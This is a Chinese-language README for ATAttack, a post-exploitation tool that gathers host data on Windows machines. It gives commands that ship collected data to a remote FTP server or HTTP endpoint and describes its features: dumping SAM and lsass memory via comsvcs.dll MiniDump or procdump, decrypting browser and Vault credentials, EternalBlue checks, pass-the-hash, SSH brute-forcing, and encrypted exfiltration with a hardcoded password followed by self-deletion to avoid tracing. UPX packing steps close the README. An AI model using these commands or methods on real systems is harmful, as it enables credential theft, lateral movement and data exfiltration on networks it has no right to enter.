#### 前言

​	 每获取一台机器权限，如果每次都手动操作重复一样的信息收集工作，无疑加大了工作量，既为了能更好的获取内网进一步突破点攻击面,这段闲暇时间造了个简易的轮子，其在真实环境中发现较多未知问题，欢迎大家踊跃提交 issue 和 PR ！

#### 开发进度：

#### 简介

**ATAttack**是一款后渗透半自动化侦察工具，它从进攻性和防御性安全角度执行许多面向安全性的主机调查“安全检查”。

项目地址：https://github.com/c1y2m3/ATAttack
![](https://www.yunzhijia.com/microblog/filesvr/5e1c398932f2ca5a1c43e852)
## 已知故障和错误列表

- 系统容错问题，增加部分功能异常处理，提高稳定性。
- 部分内网ftp协议传输限制,后期添加HTTP PUT传输。
- pyinstaller打包后的可执行文件较大，建议在纯净环境下打包可执行文件更小

####  快照预览

###### win10测试环境

![](https://www.yunzhijia.com/microblog/filesvr/5dbe4d62b54c8d19b5579f55)

win2008测试环境：

![](https://www.yunzhijia.com/microblog/filesvr/5dc59c7d28011f682aaec035)

##### 使用方法

###### cmd.exe

存储于本地临时文件夹：

```
python exploit.py
```

回传远程FTP服务器：

```
python exploit.py -t ftp_host -u ftp_user -p ftp_pwd
```

通过PUT请求回传http服务端

```
python exploit.py -d http://10.10.10.10:8000/ 
```

HTTP分块传输落地可执行文件 

```
python http_client.py -d http://10.10.10.10./exploit.exe -u http://10.10.10.10:8000/ 
```

###### 一、基础信息获取：

1、系统驱动器、主机版本信息获取,当前系统进程识别，判断是否存在杀软av进程

2、单机所有用户以及当前用户RDP远程连接导出 

3、当前系统已安装程序列表获取 ,

4、在当前用户文件夹下查找指定文件，如word、pdf、txt、csv等敏感数据


###### 二、主机网段收集:

1、基于提取系统远程连接记录，如：远程桌面，arp缓存，windows系统日志(4624、4625)等

（浏览器浏览记录、单机系统记录，系统登录日志记录筛选提取IP）

2、主流浏览器浏览记录提取，通过位操作符判断筛选私有地址去重划分网段。

###### 三、凭证获取:

1、注册表存储sam提取、在线解密  %SystemRoot%\system32\config\sam  

2、使用comsvcs.dll 中MiniDump 函数 dump指定lsass进程,

如失败则使用procdump提取lsa缓存进程，回传ftp或http服务端，半自动化离线解密  

3、通过netsh 导出系统 wifi密码[暂时删除]、Windows Vaults 普通 / WEB 凭据提取

3、主流浏览器存储密码在线|离线模式解密,目前覆盖chrome、360chrome、ie,fiefox

fiefox浏览器解密基于key3.db、key4.db，logins.json文件，密钥加密，回传文件离线解密。

4、第三方主机软件 ，如 Navicat、Putty ,foxmail在线解密 [未完成]

###### 四、横向移动

1、探测网段存活，如存活则识别对应windows系统操作版本

2、如系统版本为windows系统，则检测是否存在永恒之蓝漏洞

3、基于解密出的ntlmhash，对存活主机进行pth哈希传递攻击，执行回显命令。

4、如系统为linux则对ssh端口服务进行探测，并进行爆破ssh弱口令。


###### 五：数据回传

将获取的数据落地到本地用户Temp文件夹下存储，进行加密压缩回传，解压密钥为：

`Za!@#$@&**(aKg`，尽可能避免了网络设备溯源，程序结束后进行自删除

1、系统所安装的浏览器浏览历史记录，暂命名为update.log

2、系统所搜索的敏感数据文件存储，暂命名为drive.txt

3、通过提取lsass进程所保存的内存文件，暂命名为lsass.dmp

4、内网主机所识别对应的windows版本，归属于工作组或域主机信息，暂命名为host.txt

## 打包ATAttack二进制文件

##### 测试打包环境:

- Python 2.7.15
- PyInstaller 3.4
- Windows 10

通过[UPX](https://upx.github.io/)压缩，使得ATAttack程序落地更小

- 下载UPX(测试环境为upx-3.95-win64版本)

  `https://github.com/upx/upx/releases`

- pip安装[pyinstaller](https://www.pyinstaller.org/)

  `pip install pyinstaller`

- 进入`ATAttack`目录,并通过upx压缩

  `pyinstaller -F exploit.py --upx-dir=upx-3.95-win64`

- 成功打包二进制控制台单文件`\ATAttack\dist]\exploit.exe`

